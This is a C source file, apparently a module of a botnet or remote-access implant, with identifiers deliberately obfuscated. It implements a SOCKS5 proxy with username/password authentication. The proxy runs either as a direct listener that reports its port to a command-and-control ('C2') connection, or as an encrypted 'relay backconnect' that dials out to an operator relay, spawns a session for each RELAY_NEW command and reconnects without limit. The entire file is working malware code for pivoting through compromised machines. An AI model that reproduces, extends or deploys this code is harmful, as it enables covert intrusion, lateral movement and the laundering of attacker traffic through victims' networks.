/* socks.c — SOCKS5 proxy: direct listener, auth */

#include "bot.h"

#define _uA8gU4j       0x05
#define _Wk3td7r 0x00
#define _Dt8Ug7s 0x02
#define _vm6Lk6k 0xFF
#define _jN3im7U  0x01
#define _st8Wr2M   0x01
#define _pM2Em3f  0x03
#define _so5rM8J   0x04
#define _Ek4Qk3A  0x00
#define _Xg2Gf3D 0x01
#define _FF3Bb5g 0x04

#define _yT4PU6G   8192

/* ======================================================================
   HELPERS
   ====================================================================== */

/* Read exactly n bytes from fd. Returns 0 on success, -1 on failure. */
static int _MF2QK6j(int fd, uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(fd, buf + off, n - off);
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}

/* Write exactly n bytes to fd. Returns 0 on success, -1 on failure. */
static int _Yu4at3o(int fd, const uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t w = write(fd, buf + off, n - off);
        if (w <= 0) return -1;
        off += (size_t)w;
    }
    return 0;
}

/* Set socket to non-blocking (for poll-based relay). */
static void _bF4CF3c(int fd)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

/* Resolve hostname:port and connect. Returns fd or -1. */
static int tcp_connect(const char *host, uint16_t port)
{
    struct addrinfo hints, *res, *rp;
    char portbuf[8];
    int fd = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(portbuf, sizeof(portbuf), "%u", (unsigned)port);

    if (getaddrinfo(host, portbuf, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* ======================================================================
   BIDIRECTIONAL RELAY (two plain fds)
   ====================================================================== */

struct _sf4hN8e {
    int fd_a;
    int fd_b;
};

static void *_yP7ai7Q(void *arg)
{
    struct _sf4hN8e *rp = (struct _sf4hN8e *)arg;
    uint8_t buf[_yT4PU6G];
    ssize_t n;

    while ((n = read(rp->fd_a, buf, sizeof(buf))) > 0) {
        if (_Yu4at3o(rp->fd_b, buf, (size_t)n) < 0) break;
    }
    shutdown(rp->fd_b, SHUT_WR);
    return NULL;
}

static void _ax7cx4Y(int fd, int secs)
{
    struct timeval tv;
    tv.tv_sec  = secs;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}

static void _tg2FF7z(int fd_a, int fd_b)
{
    struct _sf4hN8e fwd, rev;
    pthread_t tid;

    /* Prevent relay threads from hanging forever on silent peers */
    _ax7cx4Y(fd_a, 120);
    _ax7cx4Y(fd_b, 120);

    fwd.fd_a = fd_a;
    fwd.fd_b = fd_b;
    rev.fd_a = fd_b;
    rev.fd_b = fd_a;

    pthread_create(&tid, NULL, _yP7ai7Q, &fwd);

    /* reverse direction in current thread */
    {
        uint8_t buf[_yT4PU6G];
        ssize_t n;
        while ((n = read(rev.fd_a, buf, sizeof(buf))) > 0) {
            if (_Yu4at3o(rev.fd_b, buf, (size_t)n) < 0) break;
        }
        shutdown(rev.fd_b, SHUT_WR);
    }

    pthread_join(tid, NULL);
    close(fd_a);
    close(fd_b);
}

/* ======================================================================
   SOCKS5 HANDLER — ac8JR6M
   ====================================================================== */

void ac8JR6M(int client_fd)
{
    uint8_t buf[512];
    uint8_t nmethods, method;
    int need_auth, authed;
    uint8_t ver, cmd, atyp;
    char target_host[256];
    uint16_t target_port;
    int target_fd;
    size_t i;
    uint8_t reply[10];

    at_inc(&_EE6MZ7b);

    /* --- greeting --- */
    if (_MF2QK6j(client_fd, buf, 2) < 0) goto fail;
    if (buf[0] != _uA8gU4j) goto fail;
    nmethods = buf[1];
    if (nmethods == 0 || nmethods > 255) goto fail;
    if (_MF2QK6j(client_fd, buf, nmethods) < 0) goto fail;

    /* Determine if auth is required */
    pthread_mutex_lock(&_kL3Yy7R);
    need_auth = !ds_empty(&_yr2Dc6W);
    pthread_mutex_unlock(&_kL3Yy7R);

    if (need_auth) {
        /* Look for username/password method */
        method = _vm6Lk6k;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == _Dt8Ug7s) { method = _Dt8Ug7s; break; }
        }
        { uint8_t resp[2]; resp[0] = _uA8gU4j; resp[1] = method;
          if (_Yu4at3o(client_fd, resp, 2) < 0) goto fail; }
        if (method == _vm6Lk6k) goto fail;

        /* RFC 1929 username/password sub-negotiation */
        {
            uint8_t ulen, plen;
            char user[256], pass[256];
            int ok;

            if (_MF2QK6j(client_fd, buf, 2) < 0) goto fail;
            /* buf[0] is sub-negotiation version (0x01) */
            ulen = buf[1];
            if (ulen == 0) goto fail;
            if (_MF2QK6j(client_fd, (uint8_t *)user, ulen) < 0) goto fail;
            user[ulen] = '\0';
            if (_MF2QK6j(client_fd, buf, 1) < 0) goto fail;
            plen = buf[0];
            if (_MF2QK6j(client_fd, (uint8_t *)pass, plen) < 0) goto fail;
            pass[plen] = '\0';

            pthread_mutex_lock(&_kL3Yy7R);
            ok = (strcmp(user, ds_cstr(&_yr2Dc6W)) == 0 &&
                  strcmp(pass, ds_cstr(&_uv4SZ5A)) == 0);
            pthread_mutex_unlock(&_kL3Yy7R);

            { uint8_t aresp[2]; aresp[0] = 0x01;
              aresp[1] = ok ? 0x00 : 0x01;
              if (_Yu4at3o(client_fd, aresp, 2) < 0) goto fail; }
            if (!ok) goto fail;
        }
    } else {
        /* Look for no-auth method */
        method = _vm6Lk6k;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == _Wk3td7r) { method = _Wk3td7r; break; }
        }
        { uint8_t resp[2]; resp[0] = _uA8gU4j; resp[1] = method;
          if (_Yu4at3o(client_fd, resp, 2) < 0) goto fail; }
        if (method == _vm6Lk6k) goto fail;
    }

    /* --- connect request --- */
    if (_MF2QK6j(client_fd, buf, 4) < 0) goto fail;
    ver  = buf[0];
    cmd  = buf[1];
    /* buf[2] is RSV */
    atyp = buf[3];

    if (ver != _uA8gU4j || cmd != _jN3im7U) {
        /* Send command not supported reply */
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = 0x07; /* command not supported */
        reply[3] = _st8Wr2M;
        _Yu4at3o(client_fd, reply, 10);
        goto fail;
    }

    target_host[0] = '\0';
    target_port = 0;

    if (atyp == _st8Wr2M) {
        uint8_t ipv4[4];
        if (_MF2QK6j(client_fd, ipv4, 4) < 0) goto fail;
        snprintf(target_host, sizeof(target_host), "%u.%u.%u.%u",
                 ipv4[0], ipv4[1], ipv4[2], ipv4[3]);
    } else if (atyp == _so5rM8J) {
        uint8_t ipv6[16];
        if (_MF2QK6j(client_fd, ipv6, 16) < 0) goto fail;
        inet_ntop(AF_INET6, ipv6, target_host, sizeof(target_host));
    } else if (atyp == _pM2Em3f) {
        uint8_t dlen;
        if (_MF2QK6j(client_fd, &dlen, 1) < 0) goto fail;
        if (dlen == 0 || dlen > 253) goto fail;
        if (_MF2QK6j(client_fd, (uint8_t *)target_host, dlen) < 0) goto fail;
        target_host[dlen] = '\0';
    } else {
        /* Address type not supported */
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = 0x08; /* address type not supported */
        reply[3] = _st8Wr2M;
        _Yu4at3o(client_fd, reply, 10);
        goto fail;
    }

    /* Read port (2 bytes, network order) */
    {
        uint8_t portbuf[2];
        if (_MF2QK6j(client_fd, portbuf, 2) < 0) goto fail;
        target_port = (uint16_t)((portbuf[0] << 8) | portbuf[1]);
    }

    _nS5PJ8Y("socks5 connect: %s:%u", target_host, (unsigned)target_port);

    /* Connect to target */
    target_fd = tcp_connect(target_host, target_port);
    if (target_fd < 0) {
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = _FF3Bb5g;
        reply[3] = _st8Wr2M;
        _Yu4at3o(client_fd, reply, 10);
        goto fail;
    }

    /* Send success reply */
    memset(reply, 0, sizeof(reply));
    reply[0] = _uA8gU4j;
    reply[1] = _Ek4Qk3A;
    reply[3] = _st8Wr2M;
    /* BND.ADDR and BND.PORT are zeros — acceptable */
    if (_Yu4at3o(client_fd, reply, 10) < 0) {
        close(target_fd);
        goto fail;
    }

    /* Relay data bidirectionally */
    _tg2FF7z(client_fd, target_fd);
    /* _tg2FF7z closes both fds */
    at_dec(&_EE6MZ7b);
    return;

fail:
    close(client_fd);
    at_dec(&_EE6MZ7b);
}

/* ======================================================================
   DIRECT LISTENER — jw8CH7B
   ====================================================================== */

struct _uE2ua7u {
    int listener_fd;
};

struct _WR6eH7V {
    int client_fd;
};

static void *_zC2cr6a(void *arg)
{
    struct _WR6eH7V *ctx = (struct _WR6eH7V *)arg;
    int fd = ctx->client_fd;
    free(ctx);
    ac8JR6M(fd);
    return NULL;
}

static void *_MV6Gv7S(void *arg)
{
    struct _uE2ua7u *ctx = (struct _uE2ua7u *)arg;
    int listener_fd = ctx->listener_fd;
    free(ctx);

    while (!at_load(&_bg6ay7T)) {
        struct sockaddr_storage addr;
        socklen_t alen = sizeof(addr);
        int client_fd;
        struct pollfd pfd;

        pfd.fd = listener_fd;
        pfd.events = POLLIN;
        if (poll(&pfd, 1, 1000) <= 0) continue;

        client_fd = accept(listener_fd, (struct sockaddr *)&addr, &alen);
        if (client_fd < 0) continue;

        {
            struct _WR6eH7V *tc = (struct _WR6eH7V *)malloc(sizeof(*tc));
            pthread_t tid;
            tc->client_fd = client_fd;
            pthread_create(&tid, NULL, _zC2cr6a, tc);
            pthread_detach(tid);
        }
    }
    return NULL;
}

int jw8CH7B(const char *port, _EA8up4M *c2)
{
    int listener_fd;
    struct sockaddr_in6 sa;
    int opt = 1;
    int portnum;
    struct _uE2ua7u *ctx;
    pthread_t tid;
    dstr msg;

    if (at_load(&_bS6gN5R)) {
        _nS5PJ8Y("socks already active");
        return -1;
    }

    portnum = atoi(port);
    if (portnum <= 0 || portnum > 65535) {
        _nS5PJ8Y("socks invalid port: %s", port);
        return -1;
    }

    listener_fd = socket(AF_INET6, SOCK_STREAM, 0);
    if (listener_fd < 0) {
        listener_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (listener_fd < 0) return -1;

        {
            struct sockaddr_in sa4;
            memset(&sa4, 0, sizeof(sa4));
            sa4.sin_family = AF_INET;
            sa4.sin_port = htons((uint16_t)portnum);
            sa4.sin_addr.s_addr = INADDR_ANY;
            setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            if (bind(listener_fd, (struct sockaddr *)&sa4, sizeof(sa4)) < 0) {
                close(listener_fd);
                return -1;
            }
        }
    } else {
        int v6only = 0;
        setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(listener_fd, IPPROTO_IPV6, IPV6_V6ONLY, &v6only, sizeof(v6only));

        memset(&sa, 0, sizeof(sa));
        sa.sin6_family = AF_INET6;
        sa.sin6_port = htons((uint16_t)portnum);
        sa.sin6_addr = in6addr_any;
        if (bind(listener_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            close(listener_fd);
            return -1;
        }
    }

    if (listen(listener_fd, 64) < 0) {
        close(listener_fd);
        return -1;
    }

    pthread_mutex_lock(&_NQ8CE5p);
    _JN8xm6T = listener_fd;
    at_store(&_bg6ay7T, 0);
    at_store(&_bS6gN5R, 1);
    ds_set(&_dz3vg3W, "direct");
    pthread_mutex_unlock(&_NQ8CE5p);

    _nS5PJ8Y("socks listener started on port %d", portnum);

    /* Notify C2 */
    if (c2) {
        ds_init(&msg);
        {
            char tmp[128];
            char addr[64];
            snprintf(addr, sizeof(addr), "0.0.0.0:%d", portnum);
            snprintf(tmp, sizeof(tmp), ds_cstr(&_hD4fS7K), addr);
            ds_set(&msg, tmp);
        }
        Ng2ZR5y(c2, ds_cstr(&msg));
        ds_free(&msg);
    }

    ctx = (struct _uE2ua7u *)malloc(sizeof(*ctx));
    ctx->listener_fd = listener_fd;
    pthread_create(&tid, NULL, _MV6Gv7S, ctx);
    pthread_detach(tid);

    return 0;
}

/* ======================================================================
   STOP PROXY — tV4Lm4J
   ====================================================================== */

static _EA8up4M *_Kx5sp5n = NULL;

void tV4Lm4J(void)
{
    int fd;
    _EA8up4M *rctrl;

    at_store(&_bg6ay7T, 1);

    pthread_mutex_lock(&_NQ8CE5p);
    fd = _JN8xm6T;
    _JN8xm6T = -1;
    rctrl = _Kx5sp5n;
    _Kx5sp5n = NULL;
    at_store(&_bS6gN5R, 0);
    ds_clear(&_dz3vg3W);
    pthread_mutex_unlock(&_NQ8CE5p);

    if (fd >= 0) close(fd);
    if (rctrl && rctrl->fd >= 0) shutdown(rctrl->fd, SHUT_RDWR);

    _nS5PJ8Y("socks proxy stopped");
}

/* ======================================================================
   EZF3 I/O HELPERS (for relay backconnect mode)
   ====================================================================== */

static int _GM2uF5w(_EA8up4M *c, uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(c->fd, buf + off, n - off);
        if (r <= 0) { c->valid = 0; return -1; }
        _gF6Fb8W(&c->recv_cipher, buf + off, (size_t)r);
        off += (size_t)r;
    }
    return 0;
}

static int _nY3XW8k(_EA8up4M *c, const uint8_t *buf, size_t n)
{
    uint8_t *tmp;
    size_t off;
    ssize_t w;

    if (!c || !c->valid || n == 0) return -1;
    tmp = (uint8_t *)malloc(n);
    if (!tmp) return -1;
    memcpy(tmp, buf, n);
    _gF6Fb8W(&c->send_cipher, tmp, n);

    off = 0;
    while (off < n) {
        w = write(c->fd, tmp + off, n - off);
        if (w <= 0) { free(tmp); c->valid = 0; return -1; }
        off += (size_t)w;
    }
    free(tmp);
    return 0;
}

/* ======================================================================
   EZF3 <-> RAW BIDIRECTIONAL RELAY
   ====================================================================== */

struct _hc5qX6i {
    _EA8up4M *vpn;
    int     raw_fd;
};

static void *_sk7uf7f(void *arg)
{
    struct _hc5qX6i *p = (struct _hc5qX6i *)arg;
    uint8_t buf[_yT4PU6G];
    ssize_t n;

    while ((n = read(p->vpn->fd, buf, sizeof(buf))) > 0) {
        _gF6Fb8W(&p->vpn->recv_cipher, buf, (size_t)n);
        if (_Yu4at3o(p->raw_fd, buf, (size_t)n) < 0) break;
    }
    shutdown(p->raw_fd, SHUT_WR);
    return NULL;
}

static void _UW7EW7q(_EA8up4M *vpn, int raw_fd)
{
    struct _hc5qX6i fwd;
    pthread_t tid;
    uint8_t buf[_yT4PU6G];
    ssize_t n;
    uint8_t *tmp;

    fwd.vpn    = vpn;
    fwd.raw_fd = raw_fd;

    /* vpn -> raw in separate thread */
    pthread_create(&tid, NULL, _sk7uf7f, &fwd);

    /* raw -> vpn in current thread */
    while ((n = read(raw_fd, buf, sizeof(buf))) > 0) {
        tmp = (uint8_t *)malloc((size_t)n);
        if (!tmp) break;
        memcpy(tmp, buf, (size_t)n);
        _gF6Fb8W(&vpn->send_cipher, tmp, (size_t)n);
        if (_Yu4at3o(vpn->fd, tmp, (size_t)n) < 0) { free(tmp); break; }
        free(tmp);
    }

    pthread_join(tid, NULL);
    ZR8pH4D(vpn);
    close(raw_fd);
}

/* ======================================================================
   SOCKS5 HANDLER — _hL3AH3U (over EZF3 data channel)
   ====================================================================== */

static void _hL3AH3U(_EA8up4M *data)
{
    uint8_t buf[512];
    uint8_t nmethods, method;
    int need_auth;
    uint8_t ver, cmd, atyp;
    char target_host[256];
    uint16_t target_port;
    int target_fd;
    size_t i;
    uint8_t reply[10];

    at_inc(&_EE6MZ7b);

    /* --- greeting --- */
    if (_GM2uF5w(data, buf, 2) < 0) goto fail;
    if (buf[0] != _uA8gU4j) goto fail;
    nmethods = buf[1];
    if (nmethods == 0 || nmethods > 255) goto fail;
    if (_GM2uF5w(data, buf, nmethods) < 0) goto fail;

    pthread_mutex_lock(&_kL3Yy7R);
    need_auth = !ds_empty(&_yr2Dc6W);
    pthread_mutex_unlock(&_kL3Yy7R);

    if (need_auth) {
        method = _vm6Lk6k;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == _Dt8Ug7s) { method = _Dt8Ug7s; break; }
        }
        { uint8_t resp[2]; resp[0] = _uA8gU4j; resp[1] = method;
          if (_nY3XW8k(data, resp, 2) < 0) goto fail; }
        if (method == _vm6Lk6k) goto fail;

        {
            uint8_t ulen, plen;
            char user[256], pass[256];
            int ok;

            if (_GM2uF5w(data, buf, 2) < 0) goto fail;
            ulen = buf[1];
            if (ulen == 0) goto fail;
            if (_GM2uF5w(data, (uint8_t *)user, ulen) < 0) goto fail;
            user[ulen] = '\0';
            if (_GM2uF5w(data, buf, 1) < 0) goto fail;
            plen = buf[0];
            if (_GM2uF5w(data, (uint8_t *)pass, plen) < 0) goto fail;
            pass[plen] = '\0';

            pthread_mutex_lock(&_kL3Yy7R);
            ok = (strcmp(user, ds_cstr(&_yr2Dc6W)) == 0 &&
                  strcmp(pass, ds_cstr(&_uv4SZ5A)) == 0);
            pthread_mutex_unlock(&_kL3Yy7R);

            { uint8_t aresp[2]; aresp[0] = 0x01;
              aresp[1] = ok ? 0x00 : 0x01;
              if (_nY3XW8k(data, aresp, 2) < 0) goto fail; }
            if (!ok) goto fail;
        }
    } else {
        method = _vm6Lk6k;
        for (i = 0; i < nmethods; i++) {
            if (buf[i] == _Wk3td7r) { method = _Wk3td7r; break; }
        }
        { uint8_t resp[2]; resp[0] = _uA8gU4j; resp[1] = method;
          if (_nY3XW8k(data, resp, 2) < 0) goto fail; }
        if (method == _vm6Lk6k) goto fail;
    }

    /* --- connect request --- */
    if (_GM2uF5w(data, buf, 4) < 0) goto fail;
    ver  = buf[0];
    cmd  = buf[1];
    atyp = buf[3];

    if (ver != _uA8gU4j || cmd != _jN3im7U) {
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = 0x07;
        reply[3] = _st8Wr2M;
        _nY3XW8k(data, reply, 10);
        goto fail;
    }

    target_host[0] = '\0';
    target_port = 0;

    if (atyp == _st8Wr2M) {
        uint8_t ipv4[4];
        if (_GM2uF5w(data, ipv4, 4) < 0) goto fail;
        snprintf(target_host, sizeof(target_host), "%u.%u.%u.%u",
                 ipv4[0], ipv4[1], ipv4[2], ipv4[3]);
    } else if (atyp == _so5rM8J) {
        uint8_t ipv6[16];
        if (_GM2uF5w(data, ipv6, 16) < 0) goto fail;
        inet_ntop(AF_INET6, ipv6, target_host, sizeof(target_host));
    } else if (atyp == _pM2Em3f) {
        uint8_t dlen;
        if (_GM2uF5w(data, &dlen, 1) < 0) goto fail;
        if (dlen == 0 || dlen > 253) goto fail;
        if (_GM2uF5w(data, (uint8_t *)target_host, dlen) < 0) goto fail;
        target_host[dlen] = '\0';
    } else {
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = 0x08;
        reply[3] = _st8Wr2M;
        _nY3XW8k(data, reply, 10);
        goto fail;
    }

    {
        uint8_t portbuf[2];
        if (_GM2uF5w(data, portbuf, 2) < 0) goto fail;
        target_port = (uint16_t)((portbuf[0] << 8) | portbuf[1]);
    }

    _nS5PJ8Y("relay socks5: %s:%u", target_host, (unsigned)target_port);

    target_fd = tcp_connect(target_host, target_port);
    if (target_fd < 0) {
        memset(reply, 0, sizeof(reply));
        reply[0] = _uA8gU4j;
        reply[1] = _FF3Bb5g;
        reply[3] = _st8Wr2M;
        _nY3XW8k(data, reply, 10);
        goto fail;
    }

    memset(reply, 0, sizeof(reply));
    reply[0] = _uA8gU4j;
    reply[1] = _Ek4Qk3A;
    reply[3] = _st8Wr2M;
    if (_nY3XW8k(data, reply, 10) < 0) {
        close(target_fd);
        goto fail;
    }

    /* Bridge: EZF3 data channel <-> raw target */
    _UW7EW7q(data, target_fd);
    at_dec(&_EE6MZ7b);
    return;

fail:
    ZR8pH4D(data);
    at_dec(&_EE6MZ7b);
}

/* ======================================================================
   RELAY SESSION THREAD — spawned per RELAY_NEW
   ====================================================================== */

struct _fJ7vW3K {
    char host[256];
    char port[16];
    char session_id[64];
};

static void *_ov7Wz4e(void *arg)
{
    struct _fJ7vW3K *ctx = (struct _fJ7vW3K *)arg;
    _EA8up4M *data;
    char line[256];

    _nS5PJ8Y("relay session %s: connecting", ctx->session_id);

    data = hq4zK8c(ctx->host, ctx->port);
    if (!data) {
        _nS5PJ8Y("relay session %s: connect failed", ctx->session_id);
        free(ctx);
        return NULL;
    }

    snprintf(line, sizeof(line), "RELAY_DATA:%s\n", ctx->session_id);
    Ng2ZR5y(data, line);

    _hL3AH3U(data);
    free(ctx);
    return NULL;
}

/* ======================================================================
   RELAY CONTROL LOOP — reads RELAY_NEW messages, sends keepalive
   ====================================================================== */

struct _CR5sE2r {
    char host[256];
    char port[16];
    _EA8up4M *ctrl;
    _EA8up4M *c2;   /* C2 connection — for sending status messages back */
};

#define _GC4bU4r      3
#define _bg2HQ6m   5   /* seconds between reconnect attempts */
#define _Uy5AD3z        300 /* 5 minutes in seconds */
#define _zx6MU2u       10  /* pause after this many reconnect attempts */

/* Try to connect and authenticate to the relay. Returns _EA8up4M* or NULL. */
static _EA8up4M *_Mk3hZ4Z(const char *host, const char *port)
{
    _EA8up4M *ctrl;
    char auth_msg[512];
    dstr resp;

    ctrl = hq4zK8c(host, port);
    if (!ctrl) return NULL;

    snprintf(auth_msg, sizeof(auth_msg), "RELAY_AUTH:%s:%s\n",
             ds_cstr(&_Lv3Qk8T), ds_cstr(&_yg5RE4m));
    Ng2ZR5y(ctrl, auth_msg);

    resp = Un4Ss4D(ctrl, 10);
    if (strcmp(ds_cstr(&resp), "RELAY_OK") != 0) {
        _nS5PJ8Y("relay: auth failed: %s", ds_cstr(&resp));
        ds_free(&resp);
        ZR8pH4D(ctrl);
        return NULL;
    }
    ds_free(&resp);
    return ctrl;
}

static void *_Ps6HH5c(void *arg)
{
    struct _CR5sE2r *ctx = (struct _CR5sE2r *)arg;
    _EA8up4M *ctrl = ctx->ctrl;
    int reconnect_count = 0;

    for (;;) {
        /* ── Control loop: handle relay commands ── */
        while (!at_load(&_bg6ay7T) && ctrl->valid) {
            dstr line = Un4Ss4D(ctrl, 60);

            if (at_load(&_bg6ay7T)) {
                ds_free(&line);
                goto done;
            }

            if (ds_len(&line) == 0) {
                ds_free(&line);
                if (!ctrl->valid) break;
                /* timeout — send keepalive */
                Ng2ZR5y(ctrl, "\n");
                continue;
            }

            if (strncmp(ds_cstr(&line), "RELAY_NEW:", 10) == 0) {
                const char *sid = ds_cstr(&line) + 10;
                struct _fJ7vW3K *sctx;
                pthread_t tid;

                sctx = (struct _fJ7vW3K *)malloc(sizeof(*sctx));
                if (sctx) {
                    strncpy(sctx->host, ctx->host, sizeof(sctx->host) - 1);
                    sctx->host[sizeof(sctx->host) - 1] = '\0';
                    strncpy(sctx->port, ctx->port, sizeof(sctx->port) - 1);
                    sctx->port[sizeof(sctx->port) - 1] = '\0';
                    strncpy(sctx->session_id, sid, sizeof(sctx->session_id) - 1);
                    sctx->session_id[sizeof(sctx->session_id) - 1] = '\0';

                    pthread_create(&tid, NULL, _ov7Wz4e, sctx);
                    pthread_detach(tid);
                }
            }

            ds_free(&line);
        }

        /* ── Disconnected — check if we should stop ── */
        if (at_load(&_bg6ay7T))
            goto done;

        ZR8pH4D(ctrl);
        ctrl = NULL;

        _nS5PJ8Y("relay: disconnected from %s:%s, attempting reconnect", ctx->host, ctx->port);

        /* Notify C2 that relay dropped */
        if (ctx->c2 && ctx->c2->valid) {
            char sbuf[320];
            snprintf(sbuf, sizeof(sbuf), "[socks] relay disconnected %s:%s\n", ctx->host, ctx->port);
            Ng2ZR5y(ctx->c2, sbuf);
        }

        /* Clear ctrl conn but keep _bS6gN5R=1 — thread is still running.
         * Clearing _bS6gN5R=0 here would allow C2 to spawn a second
         * _Ps6HH5c, causing two competing threads. */
        pthread_mutex_lock(&_NQ8CE5p);
        _Kx5sp5n = NULL;
        pthread_mutex_unlock(&_NQ8CE5p);

        /* ── Reconnect loop (unlimited, pause 5min every 10 attempts) ── */
        while (!at_load(&_bg6ay7T)) {
            reconnect_count++;

            if (reconnect_count > 0 && (reconnect_count % _zx6MU2u) == 0) {
                _nS5PJ8Y("relay: %d reconnect attempts, pausing %ds", reconnect_count, _Uy5AD3z);
                sleep(_Uy5AD3z);
                if (at_load(&_bg6ay7T)) goto done;
            } else {
                sleep(_bg2HQ6m);
                if (at_load(&_bg6ay7T)) goto done;
            }

            _nS5PJ8Y("relay: reconnect attempt %d to %s:%s", reconnect_count, ctx->host, ctx->port);
            ctrl = _Mk3hZ4Z(ctx->host, ctx->port);
            if (ctrl) {
                _nS5PJ8Y("relay: reconnected to %s:%s (attempt %d)", ctx->host, ctx->port, reconnect_count);
                reconnect_count = 0;

                pthread_mutex_lock(&_NQ8CE5p);
                _Kx5sp5n = ctrl;
                at_store(&_bS6gN5R, 1);
                pthread_mutex_unlock(&_NQ8CE5p);

                /* Notify C2 that relay is back */
                if (ctx->c2 && ctx->c2->valid) {
                    char sbuf[320];
                    snprintf(sbuf, sizeof(sbuf), "[socks] started on relay:%s:%s\n", ctx->host, ctx->port);
                    Ng2ZR5y(ctx->c2, sbuf);
                }

                break; /* back to control loop */
            }
        }

        if (at_load(&_bg6ay7T) || !ctrl)
            goto done;
    }

done:
    /* Notify C2 that proxy is fully stopped */
    if (ctx->c2 && ctx->c2->valid) {
        Ng2ZR5y(ctx->c2, "[socks] proxy stopped\n");
    }

    /* cleanup */
    pthread_mutex_lock(&_NQ8CE5p);
    _Kx5sp5n = NULL;
    at_store(&_bS6gN5R, 0);
    ds_clear(&_dz3vg3W);
    pthread_mutex_unlock(&_NQ8CE5p);

    if (ctrl) ZR8pH4D(ctrl);
    free(ctx);
    _nS5PJ8Y("relay control loop ended");
    return NULL;
}

/* ======================================================================
   RELAY BACKCONNECT — entry point
   ====================================================================== */

int MA2zo8a(const char *host, const char *port, _EA8up4M *c2)
{
    _EA8up4M *ctrl = NULL;
    struct _CR5sE2r *ctx;
    pthread_t tid;
    int attempt;

    if (at_load(&_bS6gN5R)) {
        _nS5PJ8Y("relay: already active");
        return 1; /* 1 = already active (not an error) */
    }

    /* Initial join: retry up to 3 times */
    for (attempt = 0; attempt < _GC4bU4r; attempt++) {
        if (attempt > 0) {
            _nS5PJ8Y("relay: join retry %d/%d in %ds", attempt + 1, _GC4bU4r, _bg2HQ6m);
            sleep(_bg2HQ6m);
        }
        _nS5PJ8Y("relay: connecting to %s:%s (attempt %d/%d)", host, port, attempt + 1, _GC4bU4r);
        ctrl = _Mk3hZ4Z(host, port);
        if (ctrl) break;
    }

    if (!ctrl) {
        _nS5PJ8Y("relay: failed to join after %d attempts", _GC4bU4r);
        return -1;
    }

    pthread_mutex_lock(&_NQ8CE5p);
    _Kx5sp5n = ctrl;
    at_store(&_bg6ay7T, 0);
    at_store(&_bS6gN5R, 1);
    {
        char addr[280];
        snprintf(addr, sizeof(addr), "relay:%s:%s", host, port);
        ds_set(&_dz3vg3W, addr);
    }
    pthread_mutex_unlock(&_NQ8CE5p);

    _nS5PJ8Y("relay: authenticated to %s:%s", host, port);

    ctx = (struct _CR5sE2r *)malloc(sizeof(*ctx));
    strncpy(ctx->host, host, sizeof(ctx->host) - 1);
    ctx->host[sizeof(ctx->host) - 1] = '\0';
    strncpy(ctx->port, port, sizeof(ctx->port) - 1);
    ctx->port[sizeof(ctx->port) - 1] = '\0';
    ctx->ctrl = ctrl;
    ctx->c2 = c2;

    pthread_create(&tid, NULL, _Ps6HH5c, ctx);
    pthread_detach(tid);

    return 0;
}
